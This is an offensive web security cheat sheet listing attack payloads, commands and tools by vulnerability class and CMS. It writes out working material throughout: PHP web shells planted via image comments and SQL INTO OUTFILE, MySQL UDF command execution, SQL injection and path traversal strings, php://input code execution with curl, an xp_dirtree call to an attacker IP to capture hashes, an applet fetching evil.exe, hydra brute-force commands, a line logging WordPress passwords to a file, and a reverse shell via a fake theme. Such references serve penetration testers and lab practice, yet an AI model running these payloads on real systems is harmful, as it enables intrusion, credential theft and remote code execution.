
## Vulnerabilities 

### Command Injection 

**Bypass**

```
w\h\o\a\m\i
\w\h\o\a\m\i
```

**Tools**

- Commix - <https://github.com/commixproject/commix>
  - Usage examples: <https://github.com/commixproject/commix/wiki/Usage-Examples>

### CRLF

- <https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28>

**Tools**

- CRLF-Injection-Scanner: <https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py>
- CRLF - Auto CRLF Injector: <https://github.com/rudSarkar/crlf-injector>

**Payloads**

- <https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt>
- <https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt>

### CSRF

- Methodology: https://twitter.com/Alra3ees/status/1076021203117195265
- CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/

**Tools**

- XSRFProbe: <https://github.com/0xInfection/XSRFProbe>

### File Upload

**Bypass**

- Null Byte: `%00` to bypass file name restrictions (`wpes.php%00.png`)
- Suffix file name with `%` (`example.php%`)
- Double Extensions: `wpes.png.php` `valid.txt.php`
- Altering content type
- Magic number: (Example: gif: `GIF89a;`)
  - Put `GIF89a;`​ as the first line in the file and save the file with a ​ `.gif`​ extension
  - <https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/>
- Code in image comment:
  - `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg`

**Alternative Extensions**

- PHP - pht, phpt, phtml, php3, php4, php5, php6, php7
- CFM - cfml, cfc, dbm
- ASP - aspx
- Perl - pl, pm, cgi, lib
- JSP - jspx, jsw, jsv, jspf

### Open Redirect

**Scenarios**

- Grab tokens via mis-configured apps/login flows
- Bypassing blacklists for SSRF/RCE
- XSS via "location.href = 'javascript:alert(0)1'"
- Taking advantage of fileuploads and mobile devices

**Bypasses**

```
https%3A%2F%2Fmysite.com%2F
https%3A%2F%2Fexample.com%2F%3Freturnurl%3D%2F%2Fmysite.com%2F
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
https://yoursite?c=.theirsite.com/
https://yoursite.com#.theirsite.com/
https://yoursite.com\.thersite.com/
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/ - (if they just check for *theirsite.com*, .computer is a valid tld!
https://theirsite.com.mysite.com - (Treat their domain as subdomain to yours)
/%0D/yoursite.com - (Also try %09, %00, %0a, %07)
java%0d%0ascript%0d%0a:alert(0), j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` ,java%07script:prompt`0` ,java%09scrip%07t:prompt`0`
```
<https://www.bugbountynotes.com/training/tutorial?id=1>

### SSRF

- SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: <https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978>
- SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: <https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0>
- SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: <https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739>

**Tools**

- <https://github.com/swisskyrepo/SSRFmap>

### SQL Injection

- https://www.websec.ca/kb/sql_injection#Extra_About
  - https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

**Tools**

- SqlMap:
    ```
    sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all​
    ```
- AutoSQLi: <https://github.com/jesuiscamille/AutoSQLi>
- SQLiDumper: <https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/>
- Automatic SQL injection with Charles and sqlmap api
  - <http://0r1.me/SQLiScanner/>
  - <https://github.com/0xbug/SQLiScanner>

**Payload**

- Combines blind command injection and blind sql injection (mysql) in one payload (works with no quotes/single quotes and double quotes):
  - https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065
    ```sql
    /*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
    ```
- WebShell over MySQL: `SELECT '<?php echo shell_exec($_GET['c']); ?>' INTO OUTFILE '/var/www/html/example.php'`
- User Defined Functions (UDF) (sqlmap/udf/mysql)
    ```sql
    SELECT @@plugin_dir;
    PowerShell$ Convert-Dll -DllPath lib_mysqludf_sys.dll -OutputPath bytes.txt
    SELECT CHAR(64,64,....) INTO OUTFILE '<@@plugin_dir>/lib_mysqludf_sys.dll' FIELDS ESCAPED BY '';
    CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
    SELECT sys_eval('whoami');
    ```
- Simple payloads:
    ```sql
    ' or 1=1 LIMIT 1 --
    ' or 1=1 LIMIT 1 -- -
    ' or 1=1 LIMIT 1#
    'or 1#
    ' or 1=1 --
    ' or 1=1 -- -
    ```
- Order by to get column count: `1337 order by N`
- Read file: `LOAD_FILE('/etc/passwd')`
- Read from information schema:
    ```sql
    union select 1,2,group_concat(distinct table_schema separator ',') from information_schema.tables LIMIT 1,1
    union select 1,2,group_concat(distinct table_name separator ',') from information_schema.tables where table_schema = 'security' LIMIT 1,1
    ```
- Write to file: `select 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE 'C:\htdocs\webroot\shell.php'`
- SQL Server
  - Run Responder and do following to capture hashes: `EXEC(master..xp_dirtree('\\(ATTACKER IP ADDRESS)\foo')--`
  - Add a trigger to do a malicious action (price 0)

**Language Specific**

- PHP
  - Good example from DOCs, where parameterization is not used: 
    - <http://php.net/manual/en/mysqli.examples-basic.php> (use: <https://phptherightway.com/>)

**Practice**

- <https://github.com/Audi-1/sqli-labs>

### LFI / RFI

- Universal LFI for Windows + PHP (using phpinfo): <https://rdot.org/forum/showthread.php?t=1134>
- PHP LFI to arbitrary code execution via rfc1867 file upload temporary files 

**Payloads**

- including uploaded files
- include data:// or php://input, php://filter pseudo protocol
- including logs
- including /proc/self/environ
- include session files - (usually names /tmp/sess_SESSIONID)
- include other files created by PHP application
- `C:\Windows\Temp\php<16-bit-random>.TMP` without bruteforce can do  `inc=C:\Windows\Temp\php<<`

**LFI to RCE**

- RCE with TXT upload
  - Expose .txt file and use a vulnerable `include` to include the txt file into code (evil.txt.php).
  - PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include)
- RCE with Logs
  - Use NC to write logs with malicious content to access_logs.
  - Connect and just send the attack string (In user-agent etc.).
  - Then include the log file (local file inclusion)
- RCE over SQLi
  - Return <?php echo "test"?> from SQL and see results to check if RCE is possible over SQLi

**PHP Wrappers**

- File upload with POST data
  - `curl -s --data "<?system('ls -la');?>" "http://target.host/web.php?file_path=php://input%00"`
- Base64 encode the LFI
  - `http://X.X.X.X/?page=php://filter/convert.base64-encode/resource=(PHP FILE NAME NO EXTENSION)`

### Path Traversal

**Payloads**

```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

### Client Side Attacks 

#### XSS

- Impact: <https://somdev.me/21-things-xss/>

**Tools**

- <https://github.com/s0md3v/XSStrike>

**Payloads**

- Fetch an external resource: <https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md>
- Advance XSS Persistence With Oauth: <https://github.com/dxa4481/XSSOauthPersistence>
- <https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html>
- XSS Cheat Sheet: <https://brutelogic.com.br/blog/xss-cheat-sheet/>
- <http://www.xss-payloads.com/payloads.html>
- XSS via Image
- XSS via HTTP Response Splitting
- XSS via Cookie
- XSS via AngularJS Template Injection

#### Applet

```bash
javac Java.java
echo “Permissions: all-­‐permissions” > /root/manifest.txt
    jar cvf Java.jar Java.class
    added manifest
    adding: Java.class(in = 1233) (out= 709)(deflated 42%)

keytool -­‐genkey -­‐alias signapplet -­‐keystore mykeystore -­‐keypass mykeypass -­‐storepass password123

jarsigner -­‐keystore mykeystore -­‐storepass password123 -­‐keypass mykeypass -­‐signedjar SignedJava.jar Java.jar signapplet

echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://192.168.10.5:80/evil.exe"></applet>' > /var/www/java.html
```

#### Other 

- Browser extensions:
  - LinkedIn browser plugin enumeration: https://github.com/dandrews/nefarious-linkedin
  - Browser, VMEscape and Kernel Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming

### Other 

- Practical HTTP Host header attacks: <https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html>
- Multiple Ways to Exploiting PUT Method - <https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/>

## Scenarios 

## Techniques 

### Discovery and Enumeration

- httprobe - Take a list of domains and probe for working HTTP and HTTPS servers <https://github.com/tomnomnom/httprobe>
    ```
    cat domains.txt | httprobe | tee alive.txt
    cat domains.txt | httprobe -p http:8080 -p https:4443 | tee alive.txt
    ```
- VHost
  - VHostScan: <https://github.com/codingo/VHostScan>
- Subdomains 
    ```bash
    wfuzz -u https://(TARGET DOMAIN NAME) -w /infosec/wordlists/SecLists/Discovery/DNS/subdomains-list-5000.txt -H "Host: FUZZ.(TARGET DOMAIN NAME)"
    ```
- Files and Folders
  - Gobuster: <https://github.com/OJ/gobuster>
    ```
    #!/bin/bash
    set -eu
    URL=$1
    echo "super go bustering for super brute: $URL"
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/tomcat.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/nginx.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/apache.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/ApacheTomcat.fuzz.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/sharepoint.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /root/tools/SecLists/Discovery/Web_Content/iis.txt
    gobuster -u $URL -l -s 200,204,301,302,307,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x txt,php,html,htm
    ```
  - DirBuster: <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>
  - EroDir: A fast web directory/file enumeration tool written in Rust: <https://github.com/PinkP4nther/EroDir>
  - DeepSearch: <https://github.com/m4ll0k/DeepSearch>
  - Filebuster - An extremely fast and flexible web fuzzer: <https://github.com/henshin/filebuster>
- Interesting files
  - pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: <https://github.com/MetaChar/pyHAWK>
  - Hidden directories and files as a source of sensitive information about web application: <https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad>
- Parameters
  - WFuzz - Identity parameter names: `wfuzz -c -z file,burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup`
  - Word-lists
    - <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.tx>
- Technologies used:
  - WhatWeb - recognises web technologies (& versions): <https://github.com/urbanadventurer/WhatWeb>
- Site Mapping
  - <https://code.google.com/archive/p/skipfish/>

### WAF Bypasses

- Web Application Firewall (WAF) Evasion Techniques: <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>
- Web Application Firewall (WAF) Evasion Techniques #2: <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>
- Web Application Firewall (WAF) Evasion Techniques #3: <https://www.secjuice.com/web-application-firewall-waf-evasion/>

### SSL /TLS Attacks

- [sslyze - Fast and powerful SSL/TLS server scanning library.](https://github.com/nabla-c0d3/sslyze)
- [testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws](https://testssl.sh/)
- Build a valid SSL certificate chain (or fix an incomplete chain): <https://github.com/trimstray/mkchain>

### Brute-forcing 

- W3brute - Automatic Web Application Brute Force Attack Tool: <https://github.com/aprilahijriyan/w3brute>

**POST**

```bash
hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) \
  http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"
```

**GET**

```bash
hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt (TARGET IP ADDRESS) \
  http-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Please Login|Bad Request"
```

### Fuzzing 

**Cookies** 

```bash
wfuzz -z \
 file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \
 -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT)
```

## Defense 

- Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: <https://github.com/0xInfection/Awesome-WAF>

## CMS

### Drupal

- Username Enumeration
  - <https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py>
- Password Brute-forcing
    ```bash
    curl -s http://drupal.site/user/ | grep form_build_id | cut -d "\"" -f 6
    ```
    ```bash
    hydra -l admin -P /wordlists/rockyou.txt (TARGET DRUPAL IP) \ 
        http-form-post "/?q=user/:name=admin&pass=^PASS^&form_id=user_login&form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry
    ```
- PHP Code Execution**
  - Enable​ PHP Filter​ module on the ​ Modules​
  - Add content​ then to ​ Article
  - Pasting PHP into the article body
  - Changing the ​ Text format​ to ​PHP code​
  - Clicking on ​ Preview​
- Tools
  - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

### Wordpress

- Version discovery**
    ```bash
    curl -s 192.168.56.102/wordpress/ | grep generator
    curl -s 192.168.56.102/wordpress/readme.html | grep Version
    curl -s 192.168.56.102/wordpress/wp-login.php | grep "ver="
    ```
- User enumeration
    ```bash
    for i in $(seq 1 5); do curl -sL 192.168.110.105/wordpress/?author=$i | grep '<title>'; done

    // When 'stop-user-enumeration' plugin installed
    curl -i -sL '192.168.56.102/wordpress/?wp-comments-post&author=1' | grep '<title>'
    curl -sL 192.168.56.102/wordpress/?wp-comments-post -d author=1 | grep '<title>'

    // Rest API (4.7+)
    curl -s http://localhost/wp-json/wp/v2/users
    ```
- Theme and plugin enumeration**
  - /wordpress_site/wp-content/plugins/
  - /wordpress_site/wp-content/themes/
  ```bash
  wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/CMS/wp_plugins.fuzz.txt --hc 404 192.168.56.104/wordpress/FUZZ
  nmap -sV -p 80 192.168.56.102 --script=http-wordpress-enum.nse --script-args=http-wordpress-enum.root=/wordpress/
  ```
- Enumerate users, plugins and themes
    ```
    wpscan -u http://192.168.110.105/wordpress/ -e u,ap,at
    ```

- Password Brute-forcing
    ```
    echo admin > users.txt && echo wpuser >> users.txt
    hydra -L users.txt -P lists/500.txt -e nsr 192.168.110.105 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Location"
    wpscan --users users.txt -w /root/lists/500.txt -u 192.168.110.105/wordpress/
    ```
- Privilege escalations 
    ```
    searchsploit wordpress escalation
    ```
- Log passwords from wp-login.php
    ```
    file_put_contents("creds.txt",$_POST['log']." - ".$_POST['pwd'])
    ```
- Obtain shell
  - Editing the main header.php script of the WordPress site to contain a reverse shell.
  - Uploading a fake plugin containing a reverse shell.
  - Uploading a fake theme containing a reverse shell. [http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip](http://www.mediafire.com/file/ya0qn83o0b5e3lu/fake-theme.zip)
    ```
    nc -lvp 31337
    curl 192.168.56.102/wordpress/wp-content/themes/fake-theme/header.php
    ```
- Tools
  - [WPScan - https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
  - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)
  - [wpBullet - Static code analysis for WordPress Plugins/Themes](https://github.com/webarx-security/wpbullet)

### Joomla

- Tools
  - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

### Moodle

- Tools
  - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

### SilverStripe

- Tools
  - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)

### Sharepoint 

- Important files:
  - `/_layouts/viewlsts.aspx​`

## Tools 

- BurpSuite
  - Burp Suite Pro Real-life tips & tricks: <https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf>
  - Extensions 
    - Extensions: <https://github.com/snoopysecurity/awesome-burp-extensions>
    - Turbo Intruder: <https://github.com/PortSwigger/turbo-intruder>
- ADAPT is a tool that performs automated Penetration Testing for WebApps <https://github.com/secdec/adapt>
    ```
    * OTG-IDENT-004 – Account Enumeration
    * OTG-AUTHN-001 - Testing for Credentials Transported over an Encrypted Channel
    * OTG-AUTHN-002 – Default Credentials
    * OTG-AUTHN-003 - Testing for Weak lock out mechanism
    * OTG-AUTHZ-001 – Directory Traversal
    * OTG-CONFIG-002 - Test Application Platform Configuration
    * OTG-CONFIG-006 – Test HTTP Methods
    * OTG-CRYPST-001 - Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection
    * OTG-CRYPST-002 - Testing for Padding Oracle
    * OTG-ERR-001 - Testing for Error Code
    * OTG-ERR-002 – Testing for Stack Traces
    * OTG-INFO-002 – Fingerprinting the Webserver
    * OTG-INPVAL-001 - Testing for Reflected Cross site scripting
    * OTG-INPVAL-002 - Testing for Stored Cross site scripting
    * OTG-INPVAL-003 – HTTP Verb Tampering
    * OTG-SESS-001 - Testing for Session Management Schema
    * OTG-SESS-002 – Cookie Attributes
    ```
- Hawkeye - Project security, vulnerability and general risk highlighting tool: <https://github.com/hawkeyesec/scanner-cli>
- Adobe Experience Manager (AEM) hacker toolset: <https://github.com/0ang3el/aem-hacker>

## Practice 

- <https://www.owasp.org/index.php/OWASP_Hacking_Lab>
- <http://www.dvwa.co.uk/>
- <http://www.itsecgames.com/>
- Damn Vulnerable Serverless Application: <https://www.owasp.org/index.php/OWASP_DVSA>
  - <https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA>

## Pending References

- Breaking Parser Logic!: <https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>
- A Fresh Look On Reverse Proxy Related Attacks: <https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/>